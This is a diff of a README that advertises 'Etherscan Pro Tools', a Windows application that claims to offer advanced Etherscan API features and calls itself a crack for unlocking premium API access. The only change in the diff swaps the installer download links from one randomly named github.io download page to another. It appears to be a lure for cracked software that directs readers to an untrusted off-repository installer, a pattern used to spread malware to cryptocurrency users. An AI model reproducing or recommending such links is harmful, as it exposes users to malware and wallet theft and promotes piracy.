@@ -2,7 +2,7 @@
 
 Etherscan Pro Tools is a sophisticated Windows desktop application tailored for blockchain enthusiasts and developers seeking advanced Etherscan API capabilities. This tool offers a unified interface to interact with Etherscan services, providing robust features for data analysis, transaction management, and portfolio tracking, often used as a crack solution for unlocking premium API access. With its intuitive design and powerful backend, Etherscan Pro Tools simplifies complex tasks and enhances your workflow efficiency.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -76,4 +76,4 @@ This documentation was last updated on **2026-01-15**. Ensure you are using the 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
